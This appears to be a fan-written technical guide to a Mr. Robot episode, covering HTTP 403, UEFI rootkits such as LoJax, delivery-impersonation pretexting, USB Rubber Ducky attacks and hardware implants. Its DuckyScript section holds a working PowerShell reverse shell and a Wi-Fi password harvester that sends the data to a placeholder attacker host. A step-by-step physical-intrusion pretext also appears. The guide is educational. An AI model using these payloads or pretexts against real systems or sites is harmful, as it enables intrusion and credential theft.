# Episode 3: eps4.2_403forbidden.h

## Season 4, Episode 3 | "403 Forbidden"

**Air Date:** October 20, 2019
**Directed by:** Sam Esmail

### Overview

The episode title references HTTP status code 403 Forbidden, indicating that the server understood the request but refuses to authorize it. Unlike 401, re-authenticating will not help. This mirrors the episode's themes of encountering barriers that cannot be overcome through conventional means, forcing Elliot and his allies to resort to physical access attacks, hardware-level compromises, and creative social engineering to bypass security that blocks all logical access.

---

## Hacks & Techniques

### 1. HTTP 403 Forbidden Status Code

The 403 status code signals that the server is explicitly denying access, regardless of authentication. The client's identity is known, but authorization is refused.

- **403 vs 401:** A 401 says "prove who you are." A 403 says "I know who you are, and you are not allowed."
- **Common Causes:** IP-based restrictions, directory listing disabled, file permission denials, WAF blocking, geolocation restrictions.
- **Thematic Significance:** When logical access is explicitly forbidden, the only path forward is to circumvent the access control entirely through physical or firmware-level attacks.

### 2. Firmware-Level Rootkits / BIOS/UEFI Manipulation

The episode introduces the concept of persistence at the firmware level, below the operating system, where rootkits can survive OS reinstallation, hard drive replacement, and even most forensic analysis.

#### BIOS vs UEFI

- **BIOS (Basic Input/Output System):** Legacy firmware interface. Limited security, stored on a ROM/EEPROM chip on the motherboard.
- **UEFI (Unified Extensible Firmware Interface):** Modern replacement for BIOS. Supports Secure Boot, larger partition tables (GPT), and a modular driver architecture.
- **UEFI Rootkit Attack Surface:** UEFI firmware runs before the OS loads, meaning any malicious code embedded in firmware executes with the highest privileges before any OS-level security controls initialize.

#### Firmware Rootkit Persistence Mechanism

```
Boot Sequence:
1. Power On
2. UEFI Firmware Initializes  <-- Rootkit executes HERE
3. Secure Boot Verification    <-- Rootkit bypasses or disables this
4. Bootloader Loads
5. OS Kernel Loads             <-- Rootkit re-infects OS components
6. OS fully boots
7. Antivirus Loads             <-- Too late to detect firmware rootkit
```

#### LoJax Parallel

LoJax (discovered by ESET in 2018) was the first UEFI rootkit found in the wild, attributed to the Sednit/APT28 (Fancy Bear) group:

- **Mechanism:** Modified the Serial Peripheral Interface (SPI) flash memory containing the UEFI firmware.
- **Persistence:** Survived OS reinstallation and hard drive replacement because it lived on the motherboard's flash chip.
- **Payload Delivery:** On every boot, the modified firmware dropped an agent into the Windows OS that established a connection to the C2 server.
- **Detection Difficulty:** Traditional antivirus cannot scan firmware. Specialized firmware integrity tools are required.

#### UEFI Attack Tools and Techniques

- **CHIPSEC:** Open-source framework for analyzing platform security, including firmware vulnerabilities. Can check for SPI flash write protections.
- **UEFITool:** Firmware image parsing and analysis tool for examining UEFI firmware structure.
- **Hacking Team's UEFI Rootkit:** Leaked in 2015, showed how a commercial surveillance vendor persisted through UEFI modification.

### 3. Package Delivery Social Engineering for Physical Access

The episode depicts social engineering through impersonating a delivery person to gain physical access to a secured location.

#### Package Delivery Pretext Methodology

1. **Reconnaissance:** Identify the target location's delivery procedures, loading dock access, reception desk staffing, and regular delivery schedules.
2. **Pretext Development:**
   - Obtain or fabricate a delivery uniform (UPS, FedEx, DHL, or local courier).
   - Create a convincing package addressed to a real employee (obtained through OSINT).
   - Prepare a clipboard with a delivery manifest for added authenticity.
3. **Execution:**
   - Arrive during peak delivery hours when staff are busy and less likely to scrutinize.
   - Request to deliver a package directly to the recipient's desk/office (bypasses reception).
   - Use the "I need a signature from [name]" pretext to be escorted into restricted areas.
4. **Payload Delivery:**
   - The package may contain a USB Rubber Ducky or other hardware implant.
   - While inside, the attacker can plant rogue devices, photograph sensitive information, or access unattended workstations.

#### Physical Social Engineering Principles

- **Uniform Trust:** People inherently trust individuals in uniforms (delivery, maintenance, IT support).
- **Hands Full:** Carrying packages or equipment makes people more likely to hold doors open (tailgating enabler).
- **Routine Exploitation:** Regular delivery schedules create complacency in security staff.
- **Authority Transfer:** "Your manager ordered this and said to bring it directly to the server room."

### 4. USB Rubber Ducky Keystroke Injection Attacks

The USB Rubber Ducky by Hak5 is a keystroke injection tool disguised as an ordinary USB flash drive. When plugged into a target computer, it is recognized as a keyboard (HID device) and executes pre-programmed keystrokes at superhuman speed.

#### How USB Rubber Ducky Works

1. **HID Emulation:** The device registers as a Human Interface Device (keyboard), which operating systems trust implicitly. No driver installation required.
2. **DuckyScript Payload:** Payloads are written in DuckyScript, a simple scripting language, compiled into `inject.bin`, and stored on the Rubber Ducky's micro SD card.
3. **Execution Speed:** Keystrokes are injected at speeds far exceeding human typing, often completing payloads in seconds.

#### DuckyScript Language Elements

| Command | Description |
|---|---|
| `REM` | Comment (not executed) |
| `DELAY` | Pause in milliseconds |
| `STRING` | Types the specified string |
| `ENTER` | Presses Enter key |
| `GUI` | Presses Windows/Command key |
| `ALT` | Presses Alt key |
| `CTRL` | Presses Ctrl key |
| `TAB` | Presses Tab key |

#### Example DuckyScript Payloads

**Windows Reverse Shell Payload:**
```
REM Open PowerShell as admin and execute reverse shell
DELAY 1000
GUI r
DELAY 500
STRING powershell -w hidden -nop -ep bypass
ENTER
DELAY 1000
STRING $c=New-Object System.Net.Sockets.TCPClient('attacker-ip',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
ENTER
```

**Credential Harvester:**
```
REM Extract Wi-Fi passwords and exfiltrate
DELAY 1000
GUI r
DELAY 500
STRING cmd /k
ENTER
DELAY 500
STRING netsh wlan show profiles | findstr "Profile" > %TEMP%\wifi.txt && for /f "tokens=2 delims=:" %a in (%TEMP%\wifi.txt) do netsh wlan show profile name=%a key=clear >> %TEMP%\wifipass.txt
ENTER
DELAY 3000
STRING powershell -nop -c "Invoke-WebRequest -Uri 'http://attacker-ip:8080/upload' -Method POST -InFile $env:TEMP\wifipass.txt"
ENTER
```

### 5. Physical Access Attacks and Hardware Implants

Beyond the USB Rubber Ducky, the episode touches on broader physical access attack concepts.

#### Hardware Implant Categories

- **Network Implants:**
  - **LAN Turtle (Hak5):** USB Ethernet adapter that provides covert remote access, man-in-the-middle capabilities, and DNS spoofing.
  - **Packet Squirrel (Hak5):** Inline ethernet device for packet capture and tunneling.
  - **Wi-Fi Pineapple (Hak5):** Rogue wireless access point for wireless attacks.

- **Keystroke Loggers:**
  - **KeyGrabber:** Hardware keylogger that sits between a keyboard and computer, recording all keystrokes.
  - **AirDrive Forensic Keylogger:** Includes Wi-Fi capabilities for remote log retrieval.

- **Screen Capture Devices:**
  - **Screen Crab (Hak5):** HDMI inline screen capture device with cloud upload capability.

- **Rogue Devices:**
  - **Raspberry Pi:** Can be configured as a rogue device planted inside a network for persistent remote access.
  - **Bash Bunny (Hak5):** Multi-function USB attack platform that can emulate various device types.

---

## Tools Used

| Tool | Purpose |
|---|---|
| **USB Rubber Ducky (Hak5)** | Keystroke injection via HID emulation |
| **Bash Bunny (Hak5)** | Multi-vector USB attack platform |
| **LAN Turtle (Hak5)** | Covert network implant for remote access |
| **CHIPSEC** | Firmware security analysis and UEFI vulnerability detection |
| **UEFITool** | UEFI firmware image analysis |
| **Raspberry Pi** | Rogue device for persistent network access |

---

## Commands Shown

### CHIPSEC Firmware Analysis

```bash
# Check SPI flash write protection
python chipsec_main.py -m chipsec.modules.common.spi_lock

# Dump SPI flash contents for analysis
python chipsec_util.py spi dump firmware.bin

# Check for UEFI Secure Boot configuration
python chipsec_main.py -m chipsec.modules.common.secureboot.variables

# Verify firmware integrity
python chipsec_main.py -m chipsec.modules.common.uefi.s3bootscript
```

### DuckyScript Compilation

```bash
# Compile DuckyScript to inject.bin using the encoder
java -jar duckencoder.jar -i payload.txt -o inject.bin -l us

# Alternative: use python encoder
python3 ducky-encoder.py --input payload.txt --output inject.bin --lang us
```

### Detecting USB HID Attacks (Defensive)

```bash
# Linux: Monitor USB device connections
udevadm monitor --subsystem-match=usb --property

# List connected HID devices
lsusb -v | grep -A5 "Human Interface Device"

# Windows: Check for new keyboard devices
Get-PnpDevice -Class Keyboard | Select-Object Status, FriendlyName, InstanceId
```

### Hardware Implant Detection

```bash
# Scan for rogue devices on the network
nmap -sn 192.168.1.0/24 --script broadcast-ping

# Check for unauthorized DHCP servers
nmap --script broadcast-dhcp-discover

# Detect rogue wireless access points
airodump-ng wlan0mon --band abg --output-format csv
```

---

## Real-World Parallels

### LoJax UEFI Rootkit (2018)

Discovered by ESET researchers, LoJax was the first UEFI rootkit observed in a real cyberattack:

- **Attribution:** Sednit (APT28/Fancy Bear), a Russian military intelligence (GRU) group.
- **Target:** Government organizations in the Balkans and Central/Eastern Europe.
- **Mechanism:** Modified the legitimate LoJack (Computrace) anti-theft software's firmware module to create a persistent backdoor.
- **Impact:** Demonstrated that firmware-level persistence was not just theoretical but actively used by nation-state actors.

### MosaicRegressor (2020)

Kaspersky discovered a second UEFI firmware rootkit in the wild:

- Used modified UEFI firmware images to drop malware onto victim systems.
- Targeted diplomats and NGO members in Africa, Asia, and Europe.
- Used a modified version of the HackingTeam VectorEDK UEFI bootkit (leaked in 2015).

### USB Attack Incidents

- **Stuxnet Delivery:** The Stuxnet worm that targeted Iranian nuclear facilities was reportedly delivered via infected USB drives left in parking lots near the Natanz facility.
- **2008 US Military Breach:** Agent.btz malware spread through USB drives at military bases in the Middle East, leading to a massive DOD network compromise and the creation of US Cyber Command.
- **DarkVishnya (2018):** Kaspersky reported attacks on Eastern European banks where attackers physically entered bank branches and connected small devices (Raspberry Pi, Bash Bunny, or netbooks) to the network.

### Social Engineering Through Physical Access

- **Penetration Testing Industry:** Physical social engineering (delivery impersonation, tailgating, badge cloning) is a standard part of professional red team engagements.
- **Jayson E. Street:** Famous penetration tester known for successfully social-engineering his way into banks and corporate offices worldwide, demonstrating how physical security often fails against a confident attacker with a convincing pretext.

## Tool Links

- [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky) - Keystroke injection tool via HID emulation
- [Bash Bunny](https://shop.hak5.org/products/bash-bunny) - Multi-vector USB attack platform
- [LAN Turtle](https://shop.hak5.org/products/lan-turtle) - Covert network implant for remote access
- [Nmap](https://nmap.org/) - Network scanning for rogue device detection
- [Metasploit](https://www.metasploit.com/) - Exploitation and post-exploitation framework
- [Proxmark3](https://proxmark.com/) - RFID/NFC research and cloning (indirect reference)
- [Deviant Ollam resources](https://www.deviantollam.com/) - Physical security resources
- [Lockpick tools (TOOOL)](https://toool.us/) - The Open Organisation Of Lockpickers

## MITRE ATT&CK Mapping

| Episode Technique | MITRE ATT&CK ID | Name | Link |
|---|---|---|---|
| UEFI/BIOS firmware rootkit | T1014 | Rootkit | https://attack.mitre.org/techniques/T1014/ |
| Firmware persistence (below the OS) | T1547 | Boot or Logon Autostart Execution | https://attack.mitre.org/techniques/T1547/ |
| Social engineering via package delivery | T1566 | Phishing | https://attack.mitre.org/techniques/T1566/ |
| USB Rubber Ducky - keystroke injection | T1091 | Replication Through Removable Media | https://attack.mitre.org/techniques/T1091/ |
| Hardware implants (LAN Turtle, Bash Bunny) | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |
| Command execution via keystroke injection | T1059 | Command and Scripting Interpreter | https://attack.mitre.org/techniques/T1059/ |
| Physical security bypass and tailgating | T1200 | Hardware Additions | https://attack.mitre.org/techniques/T1200/ |

## References and Further Reading

- ESET Research: "LoJax - First UEFI rootkit found in the wild" (2018) - Technical analysis of the LoJax rootkit attributed to APT28
- Kaspersky: "MosaicRegressor" (2020) - Second UEFI rootkit found in real-world attacks
- Stuxnet USB delivery - Analysis of propagation via infected USB drives
- DarkVishnya (Kaspersky, 2018) - Physical attacks on banks using Raspberry Pi and Bash Bunny devices
- Agent.btz (2008) - US military network infection via USB
- Hacking Team UEFI Rootkit (2015) - Leaked commercial rootkit documentation
- CHIPSEC Framework: https://github.com/chipsec/chipsec - Firmware security analysis
- Jayson E. Street - Internationally recognized physical security penetration tester

## Search Tags

```
tags: [USB-rubber-ducky, bash-bunny, LAN-turtle, UEFI-rootkit, firmware, physical-access, hardware-implant, keystroke-injection, social-engineering, DuckyScript, tailgating]
season: 4
episode: 3
mitre: [T1014, T1547, T1566, T1091, T1200, T1059]
```
